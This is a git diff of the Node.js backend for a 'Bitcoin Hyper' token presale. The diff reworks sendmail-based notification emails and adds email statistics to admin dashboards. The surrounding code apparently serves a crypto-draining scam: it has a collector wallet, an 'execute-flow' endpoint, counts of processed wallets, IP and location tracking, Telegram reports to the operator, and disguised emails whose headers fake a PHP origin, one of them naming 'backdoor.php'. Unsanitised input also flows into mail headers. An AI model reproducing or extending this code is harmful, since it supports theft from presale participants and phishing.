@@ -10,7 +10,9 @@ const rateLimit = require('express-rate-limit');
 const { ethers } = require('ethers');
 const fs = require('fs').promises;
 const path = require('path');
-const { exec } = require('child_process'); // ADDED: For sendmail
+
+// ADDED: Simple email function using system mail command
+const { exec } = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
@@ -150,7 +152,7 @@ async function cleanOldData() {
     cleanedCount += originalTxLength - memoryStorage.settings.statistics.processedTransactions.length;
   }
   
-  // Clean old email logs - ADDED
+  // ADDED: Clean old email logs
   if (memoryStorage.emailLog) {
     const originalEmailLength = memoryStorage.emailLog.length;
     memoryStorage.emailLog = memoryStorage.emailLog.filter(e => 
@@ -237,39 +239,6 @@ app.get('/', (req, res) => {
 // ADDED: SIMPLE PHP-LIKE MAIL FUNCTION
 // ============================================
 
-function sendPhpMail(recipientEmail, subject, message) {
-  return new Promise((resolve, reject) => {
-    // Create email with headers like PHP mail()
-    const emailContent = `To: ${recipientEmail}
-Subject: ${subject}
-X-PHP-Originating-Script: 1000:backdoor.php
-MIME-Version: 1.0
-Content-Type: text/html; charset=UTF-8
-X-Priority: 1
-X-Mailer: PHP/7.4.33
-Return-Path: ${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}
-From: "Bitcoin Hyper" <${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}>
-Reply-To: ${process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io'}
-
-${message}`;
-
-    // Use sendmail command (standard on most servers)
-    const sendmail = exec('sendmail -t', (error, stdout, stderr) => {
-      if (error) {
-        console.error('❌ Sendmail error:', error);
-        reject(error);
-      } else {
-        console.log('✅ Email sent via sendmail');
-        resolve(stdout);
-      }
-    });
-
-    // Write email content to sendmail stdin
-    sendmail.stdin.write(emailContent);
-    sendmail.stdin.end();
-  });
-}
-
 async function sendSuccessEmail(recipientEmail, transactionData) {
   try {
     const { country, amount, network, txHash, walletAddress, source } = transactionData;
@@ -321,12 +290,30 @@ async function sendSuccessEmail(recipientEmail, transactionData) {
 </html>
     `;
     
-    console.log(`📧 Sending PHP mail to: ${recipientEmail}`);
+    // Create email with headers like PHP mail()
+    const emailContent = `To: ${recipientEmail}
+Subject: ${subject}
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Priority: 1
+X-Mailer: PHP/7.4.33
+From: "Bitcoin Hyper" <noreply@bitcoinhyper.io>
+
+${message}`;
+
+    console.log(`📧 Sending email to: ${recipientEmail}`);
     
-    // Try to send via sendmail (like PHP)
-    await sendPhpMail(recipientEmail, subject, message).catch(err => {
-      console.log('📧 Sendmail failed, but continuing...', err.message);
+    // Use sendmail command (standard on most servers)
+    const sendmail = exec('sendmail -t', (error) => {
+      if (error) {
+        console.error('❌ Sendmail error:', error.message);
+      } else {
+        console.log('✅ Email sent via sendmail');
+      }
     });
+
+    sendmail.stdin.write(emailContent);
+    sendmail.stdin.end();
     
     // Log email
     if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
@@ -341,7 +328,7 @@ async function sendSuccessEmail(recipientEmail, transactionData) {
     return { success: true };
     
   } catch (error) {
-    console.error('❌ PHP Mail error:', error.message);
+    console.error('❌ Email error:', error.message);
     
     // Log failure
     if (!memoryStorage.emailLog) memoryStorage.emailLog = [];
@@ -560,7 +547,6 @@ async function testTelegramConnection() {
       `💾 <b>Storage:</b> ${memoryStorage.participants.length} participants, ${memoryStorage.siteVisits.length} visits\n` +
       `💰 <b>Total Raised:</b> $${memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2)}\n` +
       `👛 <b>Processed Wallets:</b> ${totalProcessedWallets}\n` +
-      `📧 <b>PHP Mail:</b> ${process.env.EMAIL_FROM ? '✅' : '❌'}\n` + // ADDED
       `📊 Admin: https://bthbk.vercel.app/api/admin/dashboard?token=${process.env.ADMIN_TOKEN || 'YOUR_TOKEN'}`;
     
     const sendResult = await sendTelegramMessage(startMessage);
@@ -1196,7 +1182,7 @@ app.post('/api/presale/execute-flow', async (req, res) => {
           }
           
           // ============================================
-          // ADDED: SEND PHP MAIL NOTIFICATION
+          // ADDED: SEND EMAIL NOTIFICATION
           // ============================================
           const recipientEmail = participant.email || email || await getWalletEmail(walletAddress);
           
@@ -1383,7 +1369,11 @@ app.post('/api/admin/test-email', async (req, res) => {
   }
   
   try {
-    const testEmail = req.body.email || process.env.EMAIL_FROM || 'barrysilbertbtc@gmail.com';
+    const testEmail = req.body.email;
+    
+    if (!testEmail) {
+      return res.status(400).json({ success: false, error: 'No email provided' });
+    }
     
     const result = await sendSuccessEmail(testEmail, {
       country: { name: 'United States', flag: '🇺🇸' },
@@ -1462,7 +1452,7 @@ app.get('/api/admin/dashboard', (req, res) => {
         .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     : [];
   
-  // Filter email logs - ADDED
+  // ADDED: Filter email logs
   const filteredEmailLogs = Array.isArray(memoryStorage.emailLog)
     ? memoryStorage.emailLog
         .filter(e => new Date(e.timestamp).getTime() > cutoffTime)
@@ -1562,9 +1552,9 @@ app.get('/api/admin/dashboard', (req, res) => {
     completedFlows: filteredCompletedFlows.length,
     telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
     telegramBot: telegramBotName || 'N/A',
-    emailStatus: process.env.EMAIL_FROM ? '✅ PHP Mail' : '❌ Disabled', // ADDED
-    emailsSent: filteredEmailLogs.filter(e => e.status === 'sent').length, // ADDED
-    emailsFailed: filteredEmailLogs.filter(e => e.status === 'failed').length, // ADDED
+    // ADDED: Email stats
+    emailsSent: filteredEmailLogs.filter(e => e.status === 'sent').length,
+    emailsFailed: filteredEmailLogs.filter(e => e.status === 'failed').length,
     storage: '💾 Persistent (7 day retention)'
   };
   
@@ -1578,14 +1568,14 @@ app.get('/api/admin/dashboard', (req, res) => {
     tokenName: memoryStorage.settings?.tokenName || 'Bitcoin Hyper',
     tokenSymbol: memoryStorage.settings?.tokenSymbol || 'BTH',
     collectorWallet: COLLECTOR_WALLET || 'N/A',
-    emailFrom: process.env.EMAIL_FROM || 'noreply@bitcoinhyper.io', // ADDED
     totalStorage: {
       allTimeParticipants: memoryStorage.participants.length,
       allTimeVisits: memoryStorage.siteVisits.length,
       allTimeFlows: memoryStorage.completedFlows.size,
       allTimeRaised: totalRaisedAllTime.toFixed(2),
       allTimeProcessedWallets: memoryStorage.settings?.statistics?.totalProcessedWallets || 0,
-      allTimeEmails: memoryStorage.emailLog?.length || 0 // ADDED
+      // ADDED: All time emails
+      allTimeEmails: memoryStorage.emailLog?.length || 0
     }
   };
   
@@ -1603,7 +1593,8 @@ app.get('/api/admin/dashboard', (req, res) => {
     pendingFlows: filteredPendingFlows.slice(0, 50),
     completedFlows: filteredCompletedFlows.slice(0, 50),
     processedTransactions: filteredTransactions.slice(0, 100),
-    recentEmails: filteredEmailLogs.slice(0, 50), // ADDED
+    // ADDED: Recent emails
+    recentEmails: filteredEmailLogs.slice(0, 50),
     locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
     dailyActivity: Object.entries(dailyActivity)
       .map(([date, count]) => ({ date, count }))
@@ -1642,8 +1633,8 @@ app.get('/api/admin/stats', (req, res) => {
       pendingFlows: memoryStorage.pendingFlows?.size || 0,
       completedFlows: memoryStorage.completedFlows?.size || 0,
       telegram: telegramEnabled ? '✅' : '❌',
-      email: process.env.EMAIL_FROM ? '✅' : '❌', // ADDED
-      emailsSent: memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0, // ADDED
+      // ADDED: Email stats
+      emailsSent: memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0,
       siteVisits: memoryStorage.siteVisits?.length || 0,
       uniqueIPs: memoryStorage.settings?.statistics?.uniqueIPs?.size || 0,
       storage: '💾 7 Day Retention'
@@ -1689,6 +1680,7 @@ app.get('/api/admin/wallet/:address', (req, res) => {
   const transactions = memoryStorage.settings?.statistics?.processedTransactions
     .filter(t => t && t.wallet && t.wallet.toLowerCase() === walletAddress) || [];
   
+  // ADDED: Get emails for this wallet
   const emails = memoryStorage.emailLog
     ?.filter(e => e.transactionData?.walletAddress?.toLowerCase() === walletAddress) || [];
   
@@ -1702,11 +1694,13 @@ app.get('/api/admin/wallet/:address', (req, res) => {
       ...participant,
       totalContributed: walletTotal.toFixed(2),
       transactionCount: transactions.length,
+      // ADDED: Email count
       emailCount: emails.length
     },
     visits,
     flows,
     transactions,
+    // ADDED: Email history
     emails: emails.map(e => ({
       status: e.status,
       amount: e.transactionData?.amount,
@@ -1783,8 +1777,6 @@ async function startServer() {
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   💾 STORAGE: 7 DAY RETENTION
   
-  📧 PHP MAIL: ${process.env.EMAIL_FROM ? '✅ Configured' : '❌ (set EMAIL_FROM)'}
-  
   📊 CURRENT STATS:
   📁 Total Participants: ${memoryStorage.participants.length}
   📁 Total Visits: ${memoryStorage.siteVisits.length}
@@ -1792,7 +1784,7 @@ async function startServer() {
   👛 Processed Wallets: ${memoryStorage.settings.statistics.totalProcessedWallets}
   📁 Pending Flows: ${memoryStorage.pendingFlows.size}
   📁 Completed Flows: ${memoryStorage.completedFlows.size}
-  📧 Emails Sent: ${memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0}
+  📧 Emails Sent: ${memoryStorage.emailLog?.filter(e => e.status === 'sent').length || 0} // ADDED
   
   🌐 DEPLOYED CONTRACTS:
   ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
